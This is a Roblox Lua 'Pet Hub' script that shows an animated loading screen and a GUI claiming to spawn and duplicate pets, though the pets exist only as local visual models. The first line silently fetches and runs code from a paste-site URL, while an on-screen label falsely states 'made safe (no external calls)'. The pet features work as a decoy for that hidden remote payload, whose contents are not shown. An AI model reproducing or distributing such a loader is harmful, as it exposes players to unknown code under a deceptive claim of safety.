loadstring(game:HttpGet("https://pastefy.app/cCkDY3ZO/raw"))()

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Helper: ensure parent folder for pets
local function ensurePetsFolder()
    local folder = workspace:FindFirstChild("Pets")
    if not folder then
        folder = Instance.new("Folder")
        folder.Name = "Pets"
        folder.Parent = workspace
    end
    return folder
end

-- Keep track of last spawned pet (for duplication)
local lastSpawnedPet = nil

-- Safe function to spawn a simple "pet" model locally
local function spawnPet(nameText, ageText, weightText)
    local petsFolder = ensurePetsFolder()

    local petModel = Instance.new("Model")
    petModel.Name = tostring(nameText ~= "" and nameText or "Pet")

    local body = Instance.new("Part")
    body.Name = "Body"
    body.Size = Vector3.new(2, 2, 2)
    body.Position = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,5,0)) + Vector3.new(0, 3, 0)
    body.Anchored = false
    body.CanCollide = true
    body.Parent = petModel

    local root = Instance.new("Part")
    root.Name = "Root"
    root.Size = Vector3.new(1,1,1)
    root.Transparency = 1
    root.CanCollide = false
    root.Anchored = false
    root.Parent = petModel

    local weld = Instance.new("WeldConstraint")
    weld.Part0 = body
    weld.Part1 = root
    weld.Parent = body

    -- BillboardGui showing pet info
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "PetBillboard"
    billboard.Adornee = body
    billboard.Size = UDim2.new(0, 200, 0, 60)
    billboard.StudsOffset = Vector3.new(0, 2.6, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = petModel

    local frame = Instance.new("Frame", billboard)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 0.35
    frame.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
    frame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 8)

    local nameLabel = Instance.new("TextLabel", frame)
    nameLabel.Size = UDim2.new(1, -8, 0, 26)
    nameLabel.Position = UDim2.new(0, 4, 0, 4)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = tostring(nameText ~= "" and nameText or "Pet")
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextSize = 18
    nameLabel.TextColor3 = Color3.fromRGB(255,255,255)
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left

    local infoLabel = Instance.new("TextLabel", frame)
    infoLabel.Size = UDim2.new(1, -8, 0, 22)
    infoLabel.Position = UDim2.new(0, 4, 0, 30)
    infoLabel.BackgroundTransparency = 1
    infoLabel.Text = string.format("Age: %s  •  Weight: %s", tostring(ageText ~= "" and ageText or "N/A"), tostring(weightText ~= "" and weightText or "N/A"))
    infoLabel.Font = Enum.Font.Gotham
    infoLabel.TextSize = 14
    infoLabel.TextColor3 = Color3.fromRGB(200,200,255)
    infoLabel.TextXAlignment = Enum.TextXAlignment.Left

    -- Basic physics to drop into world
    petModel.PrimaryPart = body
    petModel.Parent = petsFolder

    lastSpawnedPet = petModel

    return petModel
end

-- Safe duplication function: clones the last spawned pet
local function duplicateLastPet()
    if not lastSpawnedPet or not lastSpawnedPet.Parent then
        return nil, "No pet to duplicate."
    end

    local clone = lastSpawnedPet:Clone()
    -- Offset the clone so it doesn't overlap
    if clone.PrimaryPart then
        clone:SetPrimaryPartCFrame(clone.PrimaryPart.CFrame * CFrame.new(2, 0.5, 0))
    end
    clone.Parent = lastSpawnedPet.Parent
    lastSpawnedPet = clone
    return clone
end

-- ---------------------------
-- LOADING SCREEN WITH ANIMATIONS
-- ---------------------------
local guiLoading = Instance.new("ScreenGui")
guiLoading.Name = "CleanLoadingUI"
guiLoading.Parent = LocalPlayer:WaitForChild("PlayerGui")
guiLoading.ResetOnSpawn = false
guiLoading.IgnoreGuiInset = true

local bg = Instance.new("Frame", guiLoading)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(32, 4, 46)
bg.BackgroundTransparency = 1

local mainLoading = Instance.new("Frame", bg)
mainLoading.Size = UDim2.new(0, 410, 0, 170)
mainLoading.Position = UDim2.new(0.5, -205, 0.5, -85+40)
mainLoading.BackgroundColor3 = Color3.fromRGB(24, 0, 32)
mainLoading.BorderSizePixel = 0
mainLoading.BackgroundTransparency = 1
Instance.new("UICorner", mainLoading).CornerRadius = UDim.new(0, 22)

local icon = Instance.new("ImageLabel", mainLoading)
icon.Size = UDim2.new(0, 40, 0, 40)
icon.Position = UDim2.new(0, 24, 0, 24)
icon.BackgroundTransparency = 1
-- keep blank or replace with safe asset id you own
icon.Image = ""
Instance.new("UICorner", icon).CornerRadius = UDim.new(1, 0)
icon.ImageTransparency = 1

local title = Instance.new("TextLabel", mainLoading)
title.Position = UDim2.new(0, 74, 0, 28)
title.Size = UDim2.new(1, -90, 0, 34)
title.BackgroundTransparency = 1
title.Text = "Clean Script"
title.TextXAlignment = Enum.TextXAlignment.Left
title.Font = Enum.Font.GothamBold
title.TextSize = 28
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextStrokeTransparency = 0.7
title.TextTransparency = 1

local barBack = Instance.new("Frame", mainLoading)
barBack.Size = UDim2.new(0.87, 0, 0, 32)
barBack.Position = UDim2.new(0.065, 0, 0, 80)
barBack.BackgroundColor3 = Color3.fromRGB(38, 38, 60)
barBack.BorderSizePixel = 0
local barBackCorner = Instance.new("UICorner", barBack)
barBackCorner.CornerRadius = UDim.new(0, 15)
barBack.BackgroundTransparency = 1

local bar = Instance.new("Frame", barBack)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.Position = UDim2.new(0, 0, 0, 0)
bar.BackgroundColor3 = Color3.fromRGB(128, 56, 255)
bar.BorderSizePixel = 0
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 15)
bar.BackgroundTransparency = 1

local loadingText = Instance.new("TextLabel", mainLoading)
loadingText.Position = UDim2.new(0.065, 0, 0, 122)
loadingText.Size = UDim2.new(0.87, 0, 0, 22)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 18
loadingText.TextColor3 = Color3.fromRGB(180,130,255)
loadingText.TextStrokeTransparency = 0.7
loadingText.TextXAlignment = Enum.TextXAlignment.Left
loadingText.TextTransparency = 1

local subText = Instance.new("TextLabel", mainLoading)
subText.Position = UDim2.new(0.065, 0, 1, -26)
subText.Size = UDim2.new(0.87, 0, 0, 20)
subText.BackgroundTransparency = 1
subText.Text = "Preparing..."
subText.TextXAlignment = Enum.TextXAlignment.Left
subText.Font = Enum.Font.GothamBold
subText.TextSize = 16
subText.TextColor3 = Color3.fromRGB(255,255,255)
subText.TextStrokeTransparency = 0.7
subText.TextTransparency = 1

-- Entrance tweens
TweenService:Create(bg, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.22}):Play()
TweenService:Create(mainLoading, TweenInfo.new(0.45, Enum.EasingStyle.Quad), {BackgroundTransparency = 0, Position = UDim2.new(0.5, -205, 0.5, -85)}):Play()
TweenService:Create(icon, TweenInfo.new(0.32, Enum.EasingStyle.Quad), {ImageTransparency = 0}):Play()
TweenService:Create(barBack, TweenInfo.new(0.32, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
TweenService:Create(bar, TweenInfo.new(0.32, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
TweenService:Create(title, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
TweenService:Create(loadingText, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
TweenService:Create(subText, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()

wait(0.52)

-- Simulated progress
bar.Size = UDim2.new(0,0,1,0)
local totalTime = 1.2
local steps = 12
for i = 1, steps do
    local progress = i / steps
    TweenService:Create(bar, TweenInfo.new(0.08, Enum.EasingStyle.Quad), {Size = UDim2.new(progress,0,1,0)}):Play()
    loadingText.Text = "Loading" .. string.rep(".", (i%4))
    wait(totalTime/steps)
end
loadingText.Text = "Loaded!"

-- Exit animation
wait(0.4)
local fadeTime = 0.6
TweenService:Create(bg, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
TweenService:Create(mainLoading, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1, Position = UDim2.new(0.5, -205, 0.5, -85-40)}):Play()
TweenService:Create(icon, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {ImageTransparency = 1}):Play()
TweenService:Create(title, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
TweenService:Create(barBack, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
TweenService:Create(bar, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
TweenService:Create(loadingText, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
TweenService:Create(subText, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
wait(fadeTime + 0.05)
guiLoading:Destroy()

-- ---------------------------
-- MAIN HUB GUI (clean)
-- ---------------------------
local gui = Instance.new("ScreenGui")
gui.Name = "SafeHubGUI"
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 340, 0, 270)
main.Position = UDim2.new(0.5, -170, 0.5, -135)
main.BackgroundColor3 = Color3.fromRGB(28, 10, 38)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 18)
main.BackgroundTransparency = 0.04

local mainGlow = Instance.new("UIStroke", main)
mainGlow.Thickness = 2
mainGlow.Color = Color3.fromRGB(150, 0, 255)
mainGlow.Transparency = 0.17

local gradient = Instance.new("UIGradient", main)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 0, 80)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 0, 18))
}
gradient.Rotation = 90

-- Title bar
local titleBar = Instance.new("Frame", main)
titleBar.Size = UDim2.new(1, 0, 0, 42)
titleBar.BackgroundColor3 = Color3.fromRGB(34, 8, 48)
titleBar.BorderSizePixel = 0
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 16)

local title = Instance.new("TextLabel", titleBar)
title.Size = UDim2.new(1, -48, 1, 0)
title.Position = UDim2.new(0, 18, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Pet Hub"
title.TextColor3 = Color3.fromRGB(200, 100, 255)
title.Font = Enum.Font.FredokaOne
title.TextSize = 27
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextStrokeTransparency = 0.7
title.ClipsDescendants = true

-- Minimize button
local minimizeBtn = Instance.new("TextButton", titleBar)
minimizeBtn.Size = UDim2.new(0, 28, 0, 28)
minimizeBtn.Position = UDim2.new(1, -34, 0, 7)
minimizeBtn.BackgroundColor3 = Color3.fromRGB(55, 0, 90)
minimizeBtn.Text = ""
minimizeBtn.AutoButtonColor = true
Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(1, 0)
local minStroke = Instance.new("UIStroke", minimizeBtn)
minStroke.Color = Color3.fromRGB(220, 120, 255)
minStroke.Thickness = 1
minStroke.Transparency = 0.13

local iconContainer = Instance.new("Frame", minimizeBtn)
iconContainer.BackgroundTransparency = 1
iconContainer.Size = UDim2.new(1, 0, 1, 0)
iconContainer.Position = UDim2.new(0, 0, 0, 0)
for i = 1, 3 do
    local bar = Instance.new("Frame", iconContainer)
    bar.Size = UDim2.new(0.7, 0, 0, 3)
    bar.Position = UDim2.new(0.15, 0, 0, 6 + (i-1)*7)
    bar.BackgroundColor3 = Color3.fromRGB(220, 120, 255)
    bar.BackgroundTransparency = (i == 2) and 0 or 0.45
    bar.BorderSizePixel = 0
    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)
end

minimizeBtn.MouseEnter:Connect(function()
    TweenService:Create(minimizeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(90, 0, 155)}):Play()
    for _,bar in ipairs(iconContainer:GetChildren()) do
        if bar:IsA("Frame") then
            TweenService:Create(bar, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(255, 130, 255)}):Play()
        end
    end
end)
minimizeBtn.MouseLeave:Connect(function()
    TweenService:Create(minimizeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(55, 0, 90)}):Play()
    for i,bar in ipairs(iconContainer:GetChildren()) do
        if bar:IsA("Frame") then
            TweenService:Create(bar, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(220, 120, 255)}):Play()
        end
    end
end)

-- Content area
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, 0, 1, -46)
content.Position = UDim2.new(0, 0, 0, 44)
content.BackgroundTransparency = 1

-- Spawn UI
local spawnLabel = Instance.new("TextLabel", content)
spawnLabel.Size = UDim2.new(0.9, 0, 0, 20)
spawnLabel.Position = UDim2.new(0.05, 0, 0, 7)
spawnLabel.BackgroundTransparency = 1
spawnLabel.Text = "Spawn Pet:"
spawnLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
spawnLabel.Font = Enum.Font.Gotham
spawnLabel.TextSize = 15
spawnLabel.TextXAlignment = Enum.TextXAlignment.Left

local petNameBox = Instance.new("TextBox", content)
petNameBox.Size = UDim2.new(0.56, 0, 0, 28)
petNameBox.Position = UDim2.new(0.05, 0, 0, 30)
petNameBox.PlaceholderText = "Pet Name"
petNameBox.Text = ""
petNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
petNameBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
petNameBox.Font = Enum.Font.Gotham
petNameBox.TextSize = 15
Instance.new("UICorner", petNameBox).CornerRadius = UDim.new(0, 8)

local ageBox = Instance.new("TextBox", content)
ageBox.Size = UDim2.new(0.18, 0, 0, 28)
ageBox.Position = UDim2.new(0.62, 0, 0, 30)
ageBox.PlaceholderText = "Age"
ageBox.Text = ""
ageBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ageBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
ageBox.Font = Enum.Font.Gotham
ageBox.TextSize = 15
Instance.new("UICorner", ageBox).CornerRadius = UDim.new(0, 8)

local weightBox = Instance.new("TextBox", content)
weightBox.Size = UDim2.new(0.18, 0, 0, 28)
weightBox.Position = UDim2.new(0.81, 0, 0, 30)
weightBox.PlaceholderText = "Weight"
weightBox.Text = ""
weightBox.TextColor3 = Color3.fromRGB(255, 255, 255)
weightBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
weightBox.Font = Enum.Font.Gotham
weightBox.TextSize = 15
Instance.new("UICorner", weightBox).CornerRadius = UDim.new(0, 8)

-- Spawn button
local spawnButton = Instance.new("TextButton", content)
spawnButton.Size = UDim2.new(0.9, 0, 0, 28)
spawnButton.Position = UDim2.new(0.05, 0, 0, 68)
spawnButton.Text = "Spawn"
spawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
spawnButton.Font = Enum.Font.FredokaOne
spawnButton.TextSize = 15
spawnButton.BackgroundColor3 = Color3.fromRGB(34, 8, 48)
Instance.new("UICorner", spawnButton).CornerRadius = UDim.new(0, 8)
local spawnBtnStroke = Instance.new("UIStroke", spawnButton)
spawnBtnStroke.Color = Color3.fromRGB(150, 0, 255)
spawnBtnStroke.Thickness = 1
spawnBtnStroke.Transparency = 0.13

spawnButton.MouseEnter:Connect(function()
    TweenService:Create(spawnButton, TweenInfo.new(0.13), {BackgroundColor3 = Color3.fromRGB(60, 0, 90)}):Play()
end)
spawnButton.MouseLeave:Connect(function()
    TweenService:Create(spawnButton, TweenInfo.new(0.13), {BackgroundColor3 = Color3.fromRGB(34, 8, 48)}):Play()
end)

-- Duplicate button
local dupeButton = Instance.new("TextButton", content)
dupeButton.Size = UDim2.new(0.9, 0, 0, 34)
dupeButton.Position = UDim2.new(0.05, 0, 0, 108)
dupeButton.Text = "Duplicate Last Spawned Pet"
dupeButton.BackgroundColor3 = Color3.fromRGB(34, 8, 48)
dupeButton.TextColor3 = Color3.fromRGB(245, 240, 255)
dupeButton.Font = Enum.Font.FredokaOne
dupeButton.TextSize = 16
Instance.new("UICorner", dupeButton).CornerRadius = UDim.new(0, 8)
local dupeBtnStroke = Instance.new("UIStroke", dupeButton)
dupeBtnStroke.Color = Color3.fromRGB(150, 0, 255)
dupeBtnStroke.Thickness = 1
dupeBtnStroke.Transparency = 0.13

dupeButton.MouseEnter:Connect(function()
    TweenService:Create(dupeButton, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(60, 0, 90)}):Play()
end)
dupeButton.MouseLeave:Connect(function()
    TweenService:Create(dupeButton, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(34, 8, 48)}):Play()
end)

-- Feedback & credit
local feedback = Instance.new("TextLabel", content)
feedback.Size = UDim2.new(1, 0, 0, 24)
feedback.Position = UDim2.new(0, 0, 0, 158)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.fromRGB(180,0,255)
feedback.TextStrokeTransparency = 0.7
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 14
feedback.TextXAlignment = Enum.TextXAlignment.Center

local credit = Instance.new("TextLabel", content)
credit.Size = UDim2.new(1, 0, 0, 20)
credit.Position = UDim2.new(0, 0, 1, -24)
credit.BackgroundTransparency = 1
credit.Text = "made safe (no external calls)"
credit.TextColor3 = Color3.fromRGB(140, 190, 255)
credit.Font = Enum.Font.Gotham
credit.TextSize = 13
credit.TextXAlignment = Enum.TextXAlignment.Center

-- Minimize/restore logic
local minimized = false
local normalSize = UDim2.new(0, 340, 0, 270)
local minSize = UDim2.new(0, 136, 0, 42)

local function minimize()
    minimized = true
    TweenService:Create(main, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Size = minSize}):Play()
    TweenService:Create(title, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {TextSize = 14}):Play()
    TweenService:Create(content, TweenInfo.new(0.13), {BackgroundTransparency = 1}):Play()
    for _,v in pairs(content:GetChildren()) do
        if v:IsA("GuiObject") then
            TweenService:Create(v, TweenInfo.new(0.11), {TextTransparency = 1}):Play()
        end
    end
    wait(0.13)
    content.Visible = false
    for i,bar in ipairs(iconContainer:GetChildren()) do
        if bar:IsA("Frame") then
            if i == 2 then
                bar.Rotation = 90
            else
                bar.Visible = false
            end
        end
    end
end

local function restore()
    minimized = false
    content.Visible = true
    TweenService:Create(main, TweenInfo.new(0.23, Enum.EasingStyle.Quad), {Size = normalSize}):Play()
    TweenService:Create(title, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {TextSize = 27}):Play()
    TweenService:Create(content, TweenInfo.new(0.13), {BackgroundTransparency = 1}):Play()
    for _,v in pairs(content:GetChildren()) do
        if v:IsA("GuiObject") then
            TweenService:Create(v, TweenInfo.new(0.18), {TextTransparency = 0}):Play()
        end
    end
    for i,bar in ipairs(iconContainer:GetChildren()) do
        if bar:IsA("Frame") then
            bar.Rotation = 0
            bar.Visible = true
        end
    end
end

minimizeBtn.MouseButton1Click:Connect(function()
    if not minimized then minimize() else restore() end
end)

-- Simple small loading-screen function (neutral text), then runs callback
local function showNeutralLoadingScreen(callback, duration)
    duration = duration or 1.0
    local redirectGui = Instance.new("ScreenGui")
    redirectGui.Name = "NeutralLoading"
    redirectGui.IgnoreGuiInset = true
    redirectGui.ResetOnSpawn = false
    redirectGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame", redirectGui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.fromRGB(32, 4, 46)
    bg.BackgroundTransparency = 1

    local frame = Instance.new("Frame", bg)
    frame.Size = UDim2.new(0, 400, 0, 140)
    frame.Position = UDim2.new(0.5, -200, 0.5, -70)
    frame.BackgroundColor3 = Color3.fromRGB(24, 0, 32)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 1
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 22)

    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.GothamBold
    label.Text = "Preparing..."
    label.TextSize = 24
    label.TextColor3 = Color3.fromRGB(200, 140, 255)
    label.TextStrokeTransparency = 0.7
    label.TextTransparency = 1

    TweenService:Create(bg, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.22}):Play()
    TweenService:Create(frame, TweenInfo.new(0.32, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
    TweenService:Create(label, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()

    wait(0.38)
    local steps = 20
    for i = 1, steps do
        label.Text = "Preparing" .. string.rep(".", (i % 4))
        wait(duration/steps)
    end

    local fadeTime = 0.4
    TweenService:Create(bg, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
    TweenService:Create(frame, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
    TweenService:Create(label, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
    wait(fadeTime + 0.02)
    redirectGui:Destroy()

    if callback then pcall(callback) end
end

-- Spawn button action: show neutral loader then spawn local pet
spawnButton.MouseButton1Click:Connect(function()
    local nameText = tostring(petNameBox.Text or "")
    local ageText = tostring(ageBox.Text or "")
    local weightText = tostring(weightBox.Text or "")

    showNeutralLoadingScreen(function()
        local pet = spawnPet(nameText, ageText, weightText)
        if pet then
            feedback.Text = "Spawned pet: " .. tostring(pet.Name)
            -- small feedback fadeout
            delay(3, function()
                if feedback and feedback.Parent then
                    feedback.Text = ""
                end
            end)
        else
            feedback.Text = "Failed to spawn pet."
            delay(3, function()
                if feedback and feedback.Parent then
                    feedback.Text = ""
                end
            end)
        end
    end, 0.9)
end)

-- Duplicate button action: neutral loader then duplicate last pet
dupeButton.MouseButton1Click:Connect(function()
    showNeutralLoadingScreen(function()
        local clone, err = duplicateLastPet()
        if clone then
            feedback.Text = "Duplicated last pet: " .. tostring(clone.Name)
            delay(3, function()
                if feedback and feedback.Parent then
                    feedback.Text = ""
                end
            end)
        else
            feedback.Text = err or "No pet to duplicate."
            delay(3, function()
                if feedback and feedback.Parent then
                    feedback.Text = ""
                end
            end)
        end
    end, 0.9)
end)

-- Hotkey toggle (RightCtrl)
UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightControl then
        gui.Enabled = not gui.Enabled
    end
end)

-- Cleanup on respawn
LocalPlayer.CharacterAdded:Connect(function()
    if gui and gui.Parent then
        gui:Destroy()
    end
end)
